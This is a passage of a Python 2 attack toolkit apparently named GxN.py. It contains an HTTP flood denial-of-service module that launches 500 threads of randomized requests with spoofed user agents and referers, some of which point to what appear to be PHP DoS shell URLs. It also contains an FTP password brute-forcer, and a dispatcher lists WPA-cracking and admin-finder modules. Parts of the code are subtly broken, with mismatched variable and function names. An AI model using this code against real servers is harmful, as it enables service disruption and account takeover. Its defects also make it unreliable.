		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 4.0.20506)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 ( .NET CLR 3.5.30729; .NET4.0C)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.16) Gecko/20101130 AskTbMYC/3.9.1.14019 Firefox/3.5.16')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.18) Gecko/20110320 SeaMonkey/2.0.13')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.19) Gecko/20110420 SeaMonkey/2.0.14')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.3) Gecko/20121221 Firefox/3.6.8')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.3a1pre) Gecko/20091013 Minefield/3.7a1pre')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-AU; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-CA; rv:1.9.0.5) Gecko/2009012102 Firefox/3.0.5 Flock/2.0.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.0.16) Gecko/2010021003 Firefox/3.0.16 Flock/2.5.6')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.0.5) Gecko/2009012105 Firefox/3.0.5 Flock/2.0.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070225 lolifox/0.32')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5 (.NET CLR 3.5.30729)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.3) Gecko/20100401 Firefox/3.6;MEGAUPLOAD 1.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.7 (KHTML, like Gecko) Iron/1.0.155.0 Safari/528.7')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/1.0.156.0 Safari/528.8')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.9 (KHTML, like Gecko) Iron/2.0.178.0 Safari/530.9')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Iron/3.0.189.0 Safari/531.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532+ (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.10 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.21 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.3 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.4 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Iron/4.0.227.0 Chrome/4.0.227.0 Safari/532.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Maxthon/3.0.6.27 Safari/532.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.246.0 Safari/532.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1025 Safari/532.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.275.2 Safari/532.8 Iron/4.0.275.2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.280.0 Safari/532.8 Iron/4.0.280.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Iron/4.0.275.2 Chrome/4.0.275.2 Safari/532.8')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.1 Safari/532.9')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.275.0 Safari/532.9')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.336.0 Safari/533.1 ChromePlus/1.3.8.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Iron/5.0.326.0 Chrome/5.0.326.0 Safari/533.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Lunascape/6.4.2.23236 Safari/533.3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.370.0 Safari/533.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.999 Safari/533.4')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/6.0.400.0 Safari/533.9')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3 ChromePlus/1.5.1.0alpha3')
		headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
		return(headers_useragents)

# jinirheyths ugh rhepherher ughrehy
	def referer_list():
		global header_referers
		header_referers.append('https://www.google.com/q=')
		header_referers.append('http://www.usatoday.com/search/results?q=')
		header_referers.append('http://engadget.search.aol.com/search?q=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&method=udp&host=')
		headers_referers.append('http://67.134.12.12/webdav/udp.php?act=phptools&method=udp&host=')
		headers_referers.append('http://freehotlayouts.us/404.php?act=phptools&method=udp&host=')
		headers_referers.append('http://belakshell.50webs.com/index.php?act=phptools&method=udp&host=')
		headers_referers.append('http://firman-mannte.blogspot.com/?act=phptools&method=udp&host=')
		headers_referers.append('http://beacheater.blogspot.com/2011/01/php-dos.html?act=phptools&method=udp&host=')
		headers_referers.append('http://www.1100f.com/member/?act=phptools&method=udp&host=')
		headers_referers.append('http://www.1100f.com/member/index.php?act=phptools&method=udp&host=')
		headers_referers.append('http://www.1100f.com/member?act=phptools&method=udp&host=')
		headers_referers.append('http://www.braille-house.com/components/out/?act=phptools&method=udp&host=')
		headers_referers.append('http://www.braille-house.com/components/out/\?act=phptools&method=udp&host=')
		headers_referers.append('http://belakshell.50webs.com/index.php\?act=phptool&method=udps&host=')
		headers_referers.append('http://firman-mannte.blogspot.com?act=phptools&method=udp&host=')
		headers_referers.append('http://firman-mannte.blogspot.com/\?act=phptools&method=udp&host=')
		headers_referers.append('http://ashiyane.org/forums/showthread.php?p=154364?act=phptools&method=udp&host=')
		headers_referers.append('http://pastebin.com/z2H2vf0u?act=phptools&method=udp&host=')
		headers_referers.append('http://www.1100f.com/member/\?act=phptools&method=udp&host=')
		headers_referers.append('http://zmickz.free.fr/?act=phptools&method=udp&host=')
		headers_referers.append('http://ashiyane.org/forums/showthread.php?p=154364\?act=phptools&method=udp&host=')
		headers_referers.append('http://jennpaul.net/pics/config/BurnerTM.php?act=phptools&method=udp&host=')
		headers_referers.append('http://www.webadminblog.com/index.php/tag/network/?act=phptools&method=udp&host=')
		headers_referers.append('http://www.windowsecurity.com/faqs/Trojans?act=phptools&method=udp&host=')
		headers_referers.append('http://67.134.12.12/webdav/udp.php?act=phptools&method=udp&host=')
		headers_referers.append('http://www.windowsecurity.com/faqs/Trojans/?act=phptools&method=udp&host=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&method=udp&host=')
		headers_referers.append('http://67.134.12.12/webdav/udp.php?act=p...1&time=100?act=phptools&method=udp&host=')
		headers_referers.append('http://67.134.12.12/webdav/udp.php?act=phptools&method=udp&host')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&method=udp&host=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&host?act=phptools&method=udp&host=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&host=?act=phptools&method=udp&host=')
		headers_referers.append('http://www.dslreports.com/faq/6524?act=phptools&method=udp&host=')
		headers_referers.append('http://www.digitalhome.ca/forum/showthread.php?t=118071?act=phptools&method=udp&host=')
		headers_referers.append('http://www.windowsecurity.com/faqs/Trojans/\?act=phptools&method=udp&host=')
		headers_referers.append('http://www.webadminblog.com/index.php/tag/network/\?act=phptools&method=udp&host=')
		headers_referers.append('http://www.windowsecurity.com/faqs/Trojans/''?act=phptools&method=udp&host=')
		headers_referers.append('http://tools.rosinstrument.com/proxy/?rule1?act=phptools&method=udp&host=')
		headers_referers.append('http://fbsecteamph.890m.com/?act=phptools&method=udp&host=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&method=udp&host=')
		headers_referers.append('http://freehotlayouts.us/404.php?act=phptools&method=udp&host=')
		headers_referers.append('http://visualfoodplanner.com/404.php?act=phptools&method=udp&host=')
		headers_referers.append('http://umbrela-loader.890m.com/?act=phptools&method=udp&host=')
		headers_referers.append('http://67.134.12.12/webdav/udp.php?act=phptools&method=udp&host=')
		headers_referers.append('http://kaodenuit.free.fr/post.php?act=phptools&method=udp&host=')
		headers_referers.append('http://freehotlayouts.us/404.php?act=phptools&method=udp&host=')
		headers_referers.append('http://bsit-1a1-2.890m.com/?act=phptools&method=udp&host=')
		headers_referers.append('http://mapi.co.kr/zb41pl7/bbs/data/mapi_bbs/settings.php?act=phptools&method=udp&host=')
		headers_referers.append('http://mapi.co.kr/zb41pl7/bbs/data/mapi_bbs/settings.php??act=phptools&method=udp&host=')
		headers_referers.append('http://mapi.co.kr/zb41pl7/bbs/data/mapi_bbs/settings.php?/?act=phptool&method=udps&host=')
		headers_referers.append('http://beacheater.blogspot.com/2011/01/php-dos.html?act=phptools&method=udp&host=')
		headers_referers.append('http://belakshell.50webs.com/index.php?act=phptools&method=udp&host=')
		headers_referers.append('http://firman-mannte.blogspot.com/2011_04_01_archive.html?act=phptools&method=udp&host=')
		headers_referers.append('http://firman-mannte.blogspot.com/?act=phptools&host=')
		headers_referers.append('http://toutsourtous.anatoile.com/html.php?id_menu=3206841?act=phptools&method=udp&host=')
		headers_referers.append('http://www.1100f.com/member/?act=phptools&method=udp&host=')
		headers_referers.append('http://www.clg-jjulius.fr/images/sampledata/parks/landscape/error.php.html?act=phptools&method=udp&host=')
        header_referers.append('http://engadget.search.aol.com/search?q=')
        header_referers.append('http://www.google.ru/?hl=ru&q=')
        header_referers.append('http://yandex.ru/yandsearch?text=')
        header_referers.append('http://' + host + '/')
        return(header_referers)

#vildz rhughndume ascii sthringh
	def buildblock(size):
		out_str = ''
		for i in range(0,size):
			a = random.randint(65,90)
			out_str += chr(a)
		return(out_str)

	def gfdosusage():
		print "............................................."
		print "..#######..#######..######....#####....#####."
		print ".##........##.......##...##..##...##..#......"
		print ".##...###..######...##...##..##...##..######."
		print ".##.....#..##.......##...##..##...##.......#."
		print "..#####.#..##.......######....#####...#####.."
		print "............................................."
		print' [+] Programmed by GrandFather	'
		print' [+] Greetings To :	'
		print' [+] Nightmare | GrandSon | GrandSon III | N07 F0R H!R3'
		print' [+] Usage : gfdos.py http://<url/host/IP>'
		print' [+] Usage [GxN] : GxN.py gfdos http://<url/host/IP>'
		print' [+] Autoshut by adding "love" after url :D'
		print' [+] "WITH TIME FUNCTION :D"'
#etstetiphe rikwisth
	def httpscall(url):
		useragent_list()
		referer_list()
		code=0
		if url.count("?")>0:
			param_joiner="&"
		else:
			param_joiner="?"
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(400,1000)) + '=' + buildblock(random.randint(400,1000)))
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(200,600)) + '=' + buildblock(random.randint(200,600)))
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(150,500)) + '=' + buildblock(random.randint(150,500)))
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(15,50)) + '=' + buildblock(random.randint(15,50)))
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(18,60)) + '=' + buildblock(random.randint(18,60)))
			request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
		request.add_header('User-Agent', random.choice(headers_useragents))
		request.add_header('Cache-Control', 'no-cache')
		request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
		request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
		request.add_header('Keep-Alive', random.randint(110,120))
		request.add_header('Connection', 'keep-alive')
		request.add_header('Host',host)
		try:
				urllib2.urlopen(request)
		except urllib2.HTTPError, e:
				#print e.code
				set_flag(1)
				print '[',time.strftime("%X"),']','Response Code 500 '
				code=500
		except urllib2.URLError, e:
				#print e.reason
				sys.exit()
		else:
				inc_counter()
				urllib2.urlopen(request)
		return(code)


#etstetiphe kowlherh tred
	class HTTPThread(threading.Thread):
		def run(self):
			try:
				while flag<2:
					code=httpcall(url)
					if (code==500) & (love==1):
						set_flag(2)
			except Exception, ex:
				pass

	# mhonhiters etstetiphe treds end kawnts rikwisth
	class MonitorThread(threading.Thread):
		def run(self):
			previous=request_counter
			while flag==0:
				if (previous+3000*2<request_counter) & (previous<>request_counter):
					print "%d Explosive Sent [",localtime,']' % (request_counter)
					previous=request_counter
			if flag==2:
				print '\n@GrandFamily [',time.strftime("%X"),']',"~GRAND FAMILY's ATTACK FINISHED"

#igzikyut
	if len(sys.argv) < 3:
		gfdosusage()
		sys.exit()
	else:
		if sys.argv[2]=="help":
			gfdosusage()
			sys.exit()
		else:
			print"............................................."
			print"..#######..#######..######....#####....#####."
			print".##........##.......##...##..##...##..#......"
			print".##...###..######...##...##..##...##..######."
			print".##.....#..##.......##...##..##...##.......#."
			print"..#####.#..##.......######....#####...#####.."
			print"............................................."
			print"===============[C O N S O L E]===============\n"
			print'@GrandFamily [',time.strftime("%X"),']','~ Attack Started...'
			os.system('sleep 5')
			print'@GrandFamily [',time.strftime("%X"),']','~ GFDOS is attacking to',str(sys.argv[2]),'...'
			if len(sys.argv)== 4:
				if sys.argv[3]=="love":
					set_love()
			url = sys.argv[1]
			if url.count("/")==3:
				url = url + "/"
			m = re.search('(https?\://)?([^/]*)/?.*', url)
			host = m.group(2)
			for i in range(500):
				t = HTTPThread()
				t.start()
			t = MonitorThread()
			t.start()

def f():
#GRANDFATHERxNIGHTMARE|FTPBRUTE
#Some of the codes are leeched but I've changed its functions :D
	print ftpbrute
	os.system('sleep 5')
	os.system('clear')
	import threading, time, random, sys, ftplib
	from ftplib import FTP
	from copy import copy

	if len(sys.argv) !=5:
		print "Usage ~ : GxN.py ftpbrute |target| |userlist| |wordlist|"
		sys.exit(1)

	try:
		users = open(sys.argv[3], "r").readlines()
	except(IOError):
		print "Error: USERLIST FILE DOESNT EXIST\n"
		sys.exit(1)

	try:
		words = open(sys.argv[4], "r").readlines()
	except(IOError):
		print "Error: WORDLIST FILE DOESNT EXIST\n"
		sys.exit(1)

	print "[+] n!99a:",sys.argv[2]
	print "[+] UserLST:",len(users)
	print "[+] WordLST:",len(words),"\n"

	try:
		f = FTP(sys.argv[1])
		print "[+] R3sp0ns3:\n",f.getwelcome()
	except (ftplib.all_errors):
		pass

	try:
		print "\n[+] Ch3ck1n9 4 ANUNIMUS l091n\n"
		ftp = FTP(sys.argv[2])
		ftp.login()
		ftp.retrlines('LIST')
		print "\t\nYES! Anonymous login successful!!!\n"
		ftp.quit()
	except (ftplib.all_errors):
		print "\tAWWWW! Anonymous login unsuccessful\n"

	wordlist = copy(words)

	def rl():
		for word in wordlist:
			words.append(word)

	def gw():
		lock = threading.Lock()
		lock.acquire()
		if len(words) != 0:
			value = random.sample(words,  1)
			words.remove(value[0])
		else:
			print "\nCHANGING USER\n"
			rl()
			value = random.sample(words,  1)
			users.remove(users[0])

		lock.release()
		if len(users) ==1:
			return value[0][:-1], users[0]
		else:
			return value[0][:-1], users[0][:-1]

	class Worker(threading.Thread):

		def run(self):
			value, user = gw()
			try:
				print "-"*12
				print "UseR:",user,"PaSSwORD:",value
				ftp = FTP(sys.argv[2])
				ftp.login(user, value)
				ftp.retrlines('LIST')
				print "\t\nYES! Login successful!:",value, user
				ftp.quit()
				work.join()
				sys.exit(2)
			except (ftplib.all_errors), msg:
				#print "An error occurred:", msg
				pass

	for i in range(len(words)*len(users)):
		work = Worker()
		work.start()
		time.sleep(1)

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
		#MAIN EXECUTION OF THE PROGRAM #Originally Programmed by GrandFather
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
if len(sys.argv) < 2:
	una()
	usage()
	sys.exit()
else:
	if sys.argv[1]=="h":
		usage()
		sys.exit()
	elif sys.argv[1]=="ftpbrute":
		f()
	elif sys.argv[1]=="wpacrack":
		wpa()
	elif sys.argv[1]=="gfdos":
		gfdos()
	elif sys.argv[1]=="alcmd5":
		alcmd5()
	elif sys.argv[1]=="adminfinder":
		adminfinder()
	elif sys.argv[1]=="grandfather":
		grandfather()
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
